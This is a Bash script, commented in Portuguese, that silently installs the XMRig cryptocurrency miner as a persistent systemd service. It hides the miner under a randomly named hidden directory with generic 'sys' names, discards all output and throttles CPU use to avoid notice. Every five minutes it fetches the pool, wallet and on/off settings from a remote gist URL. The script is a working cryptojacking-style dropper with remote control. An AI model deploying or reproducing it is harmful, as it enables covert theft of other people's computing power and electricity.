#!/usr/bin/env bash
set -e

########################################
# CONFIG
########################################
RAND=$(tr -dc a-z0-9 </dev/urandom | head -c 6)
BASE="/var/lib/.sys-$RAND"
BIN="d-$RAND"
CONF="$BASE/cfg.json"
STATE="$BASE/state.json"
SERVICE="sys-$RAND"
CONFIG_URL="https://gist.githubusercontent.com/hgdexslnone/76d63764034f784aade73ac14766d8ae/raw/dc9a379faf7da1e48b015088337e57af403f0f8a/config.json"

########################################
# DEPENDÊNCIAS
########################################
apt update -y
apt install -y curl wget tar jq lm-sensors hwloc msr-tools
sensors-detect --auto || true

########################################
# BAIXA XMRIG
########################################
mkdir -p "$BASE"
cd "$BASE"

URL=$(curl -s "https://api.github.com/repos/xmrig/xmrig/releases/latest" \
 | grep linux-x64.tar.gz | cut -d '"' -f 4)

wget -qO xmrig.tar.gz "$URL"
tar -xzf xmrig.tar.gz --strip-components=1
rm xmrig.tar.gz

mv xmrig "$BIN"
chmod +x "$BIN"

########################################
# SERVICE
########################################
cat > "/etc/systemd/system/${SERVICE}.service" <<EOF
[Unit]
Description=Mining Helper Service
After=network-online.target

[Service]
ExecStart=$BASE/$BIN --config=$CONF --api-worker-id=$(hostname)
WorkingDirectory=$BASE
Restart=always
Nice=10
CPUQuota=25%
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF

########################################
# CONTROL SCRIPT
########################################
cat > "$BASE/control.sh" <<'EOF'
#!/usr/bin/env bash
CFG=$(curl -fsSL CONFIG_URL || exit 0)

ENABLED=$(jq -r .enabled <<<"$CFG")
POOL=$(jq -r .pool <<<"$CFG")
WALLET=$(jq -r .wallet <<<"$CFG")
FACTOR=$(jq -r .min_hashrate_factor <<<"$CFG")
DAY_CPU=$(jq -r .day_cpu <<<"$CFG")
NIGHT_CPU=$(jq -r .night_cpu <<<"$CFG")
MAX_CPU=$(jq -r .max_cpu <<<"$CFG")

PORTS=($(jq -r '.ports[]' <<<"$CFG"))

if [ "$ENABLED" != "true" ]; then
  systemctl stop SERVICE
  exit 0
fi

if [ ! -f state.json ]; then
  best_hash=0
  best_port=""
  for port in "${PORTS[@]}"; do
    cat > cfg.json <<CONF
{
 "autosave": true,
 "donate-level": 1,
 "api": { "id": null },
 "cpu": { "enabled": true, "huge-pages": true },
 "pools": [{
   "url": "$POOL:$port",
   "user": "$WALLET",
   "pass": "$(hostname)",
   "keepalive": true
 }]
}
CONF

    systemctl restart SERVICE
    sleep 20

    HASH=$(curl -s http://127.0.0.1:16000/1/summary \
      | jq '.hashrate.total[0]' 2>/dev/null || echo 0)

    if [ "$HASH" -gt "$best_hash" ]; then
      best_hash="$HASH"
      best_port="$port"
    fi
  done

  echo "{\"best_port\":\"$best_port\",\"best_hash\":$best_hash}" > state.json
fi

BEST_PORT=$(jq -r .best_port state.json)
BEST_HASH=$(jq -r .best_hash state.json)

cat > cfg.json <<CONF2
{
 "autosave": true,
 "donate-level": 1,
 "api": { "id": null },
 "cpu": { "enabled": true, "huge-pages": true },
 "pools": [{
   "url": "$POOL:$BEST_PORT",
   "user": "$WALLET",
   "pass": "$(hostname)",
   "keepalive": true
 }]
}
CONF2

systemctl restart SERVICE
sleep 20

CURRENT_HASH=$(curl -s http://127.0.0.1:16000/1/summary \
  | jq '.hashrate.total[0]' 2>/dev/null || echo 0)

MIN_ACCEPT=$(echo "$BEST_HASH * $FACTOR" | bc | cut -d. -f1)
if [ "$CURRENT_HASH" -lt "$MIN_ACCEPT" ]; then
  rm -f state.json
fi

cat <<MET > /var/lib/.sys-metrics.prom
syshelper_hashrate $CURRENT_HASH
syshelper_best_hashrate $BEST_HASH
syshelper_port $BEST_PORT
MET
EOF

sed -i "s|SERVICE|$SERVICE|g; s|CONFIG_URL|$CONFIG_URL|g" "$BASE/control.sh"
chmod +x "$BASE/control.sh"

########################################
# TIMER
########################################
cat > "/etc/systemd/system/${SERVICE}.timer" <<EOF
[Timer]
OnBootSec=1min
OnUnitActiveSec=5min
Persistent=true

[Install]
WantedBy=timers.target
EOF

########################################
# REMOÇÃO
########################################
cat > "$BASE/remove.sh" <<EOF
#!/usr/bin/env bash
systemctl stop $SERVICE*
systemctl disable $SERVICE*
rm -rf "$BASE"
rm -f /etc/systemd/system/$SERVICE*
systemctl daemon-reexec
systemctl daemon-reload
EOF
chmod +x "$BASE/remove.sh"

########################################
# ENABLE
########################################
systemctl daemon-reexec
systemctl daemon-reload
systemctl enable $SERVICE.service $SERVICE.timer
systemctl start $SERVICE.service $SERVICE.timer

echo "✔ Instalado com sucesso"
echo "📂 Local: $BASE"
echo "🧼 Remoção: $BASE/remove.sh"
